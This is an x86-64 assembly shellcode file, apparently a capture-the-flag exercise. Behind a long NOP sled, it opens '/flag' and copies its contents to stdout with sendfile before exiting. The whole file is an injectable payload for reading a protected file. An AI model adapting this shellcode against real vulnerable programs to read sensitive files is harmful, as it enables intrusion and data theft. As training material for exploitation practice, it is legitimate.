.globl _start
.intel_syntax noprefix

_start:
    .rept 0x800
        nop
    .endr
    mov rbx, [rip+flag]         # Push flag fliename
    push rbx
    mov rax, 2                  # syscall number of open
    mov rdi, rsp                # point the first argument at stack (where we have "/flag")
    mov rsi, 0                  # NULL out the second argument (meaning, O_RDONLY)
    syscall                     # trigger open("/flag", NULL)

    mov rdi, 1                  # first argument to sendfile is the file descriptor to output to (stdout)
    mov rsi, rax                # second argument is the file descriptor returned by open
    mov rdx, 0                  # third argument is the number of bytes to skip from the input file
    mov r10, 1000               # fourth argument is the number of bytes to transfer to the output file
    mov rax, 40                 # syscall number of sendfile
    syscall                     # trigger sendfile(1, fd, 0, 1000)

    mov rax, 60                 # syscall number of exit
    syscall                     # trigger exit()

flag:
    .string "/flag"
